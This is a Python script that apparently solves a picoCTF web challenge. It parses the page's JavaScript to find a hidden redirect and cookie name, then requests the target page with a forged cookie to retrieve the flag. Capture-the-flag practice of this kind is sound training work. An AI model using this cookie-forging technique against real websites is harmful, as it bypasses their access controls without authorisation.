from urllib.parse import urljoin

import requests
import lxml.html
import re
import slimit.parser
import slimit.ast


def get_dot_accessor_value(n: slimit.ast.Node) -> str:
    if isinstance(n, slimit.ast.Identifier):
        return n.value
    elif isinstance(n, slimit.ast.DotAccessor):
        return get_dot_accessor_value(n.node) + "." + n.identifier.value
    else:
        raise ValueError(n)


parser = slimit.parser.Parser()

resp = requests.get("http://saturn.picoctf.net:55287/")
doc = lxml.html.fromstring(resp.content)
onclick_function_name = None
for node in parser.parse(doc.xpath("//button/@onclick")[0]):
    if isinstance(node, slimit.ast.ExprStatement) and isinstance(node.expr, slimit.ast.FunctionCall):
        onclick_function_name = node.expr.identifier.value
assert onclick_function_name

target_location = None
cookie_name = None

script_src = doc.xpath("//script/@src")[0]
script_text = requests.get(urljoin(resp.url, script_src)).text
parsed_script = parser.parse(script_text)
for node in parsed_script:
    if isinstance(node, slimit.ast.FuncDecl) and node.identifier.value == onclick_function_name:
        for function_element in node.elements:
            if isinstance(function_element, slimit.ast.ExprStatement) and isinstance(function_element.expr, slimit.ast.Assign):
                left = get_dot_accessor_value(function_element.expr.left)
                if left == "window.location.href":
                    target_location = function_element.expr.right.value.strip("\"").strip("'")
                elif left == "document.cookie":
                    cookie_name = function_element.expr.right.value.split("=")[0].strip("\"").strip("'")


resp = requests.get(urljoin(resp.url, target_location), cookies={cookie_name: "1"})
flag = "".join(lxml.html.fromstring(resp.text).xpath("//body//text()")).strip()

print(flag)
